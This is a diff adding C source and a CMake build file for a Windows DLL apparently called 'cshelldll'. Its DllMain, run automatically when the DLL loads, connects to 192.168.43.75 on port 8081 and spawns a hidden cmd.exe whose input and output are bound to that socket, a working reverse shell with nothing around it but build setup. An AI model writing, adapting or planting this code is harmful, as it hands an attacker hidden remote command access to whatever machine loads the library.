@@ -1,0 +1,92 @@
+#include <windows.h>
+#include <winsock2.h>
+#include <stdio.h>
+
+#include <ws2tcpip.h>
+#pragma comment(lib, "Ws2_32.lib")
+
+#define DLLEXPORT   __declspec( dllexport )
+
+DLLEXPORT BOOL DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved);
+
+BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+        case DLL_PROCESS_ATTACH:
+            //MessageBoxA(NULL, "DLL PROCESS ATTACH", "Bingo!", 0);
+
+            // Directory path to list files
+
+            SOCKET shell;
+            struct sockaddr_in sa;
+            WSADATA wsa;
+
+            char RecvServer[512];
+            STARTUPINFO si;
+            PROCESS_INFORMATION  pi;
+
+            int connection;
+            char ip_addr[] = "192.168.43.75";
+            int port = 8081;
+
+
+            WSAStartup(MAKEWORD(2,2), &wsa);
+            shell =  WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+
+            sa.sin_family = AF_INET;
+            sa.sin_port = htons(port);
+            sa.sin_addr.s_addr = inet_addr(ip_addr);
+
+            connection = WSAConnect(shell, (SOCKADDR *)&sa, sizeof(sa),NULL,NULL,NULL,NULL);
+
+            if ( connection == SOCKET_ERROR)
+
+            {
+
+                printf(" Connection to the target server failed \n ");
+                exit(0);
+
+            }
+
+            else
+            {
+                recv(shell,RecvServer, sizeof(RecvServer), 0);
+                memset(&si, 0, sizeof(si));
+                si.cb = sizeof(si);
+                si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+                si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell;
+                CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+                WaitForSingleObject(pi.hProcess, INFINITE);
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+                memset(RecvServer, 0, sizeof(RecvServer));
+
+
+            }
+
+
+
+
+            break;
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+        default:
+            break;
+    }
+    return TRUE;
+}
+
+
+
+.....................
+
+
+cmake_minimum_required(VERSION 3.25)
+project(cshelldll C)
+
+set(CMAKE_C_STANDARD 17)
+link_libraries(ws2_32)
+
+#add_executable(cshelldll main.c)
+set(CMAKE_SHARED_LIBRARY_PREFIX "")
+add_library(cshelldll SHARED main.c)
